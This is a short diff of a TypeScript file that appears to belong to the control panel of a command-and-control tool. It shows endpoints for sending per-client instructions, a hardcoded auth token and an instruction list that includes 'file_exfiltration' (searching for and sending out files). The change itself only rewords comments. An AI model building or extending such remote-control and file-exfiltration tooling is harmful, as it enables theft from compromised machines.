@@ -30,15 +30,15 @@ const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
   "file_exfiltration": "Söker och skickar specifika filer"
 };
 
-// Server configuration - Updated to match the WSGI configuration in Apache
+// Server configuration - Configured to match the WSGI/Apache setup
 const SERVER_BASE_URL = 'https://neea.fun';
-// API Endpoints based on the WSGI server
+// API Endpoints based on the WSGI server structure in Apache config
 const API_CLIENTS_ENDPOINT = '/api/clients';
 const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
 const API_CONFIG_ENDPOINT = '/api/get_config';
 const API_INSTRUCTIONS_ENDPOINT = '/api/instructions';
 
-// Authentication token - Kept the same as it will be validated by the server
+// Authentication token - This should match what is expected by your server
 const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';
 
 // Extract scripts from instructions.py
